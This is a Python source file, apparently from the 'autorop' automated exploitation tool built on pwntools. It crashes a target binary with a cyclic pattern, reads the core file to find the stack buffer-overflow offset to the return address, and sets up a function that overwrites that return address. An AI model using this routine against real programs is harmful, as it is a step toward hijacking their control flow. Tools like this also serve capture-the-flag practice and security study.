from autorop import PwnState
from pwn import tube, process, cyclic, cyclic_find, log, pack


def corefile(state: PwnState) -> PwnState:
    """Find the offset to the return address via buffer overflow.

    This function not only finds the offset from the input to the return address
    on the stack, but also sets `overwriter` to be a function that correctly
    overwrites starting at the return address"""
    CYCLIC_SIZE = 1024
    if state.bof_ret_offset is None:
        # cause crash and find offset via corefile
        p: tube = process(state.binary_name)
        p.sendline(cyclic(CYCLIC_SIZE))
        p.wait()
        fault: int = p.corefile.fault_addr
        log.info("Fault address @ " + hex(fault))
        state.bof_ret_offset = cyclic_find(pack(fault))
    log.info("Offset to return address is " + str(state.bof_ret_offset))

    # define overwriter as expected - to write data starting at return address
    def overwriter(t: tube, data: bytes) -> None:
        t.sendline(cyclic(state.bof_ret_offset) + data)

    state.overwriter = overwriter
    return state
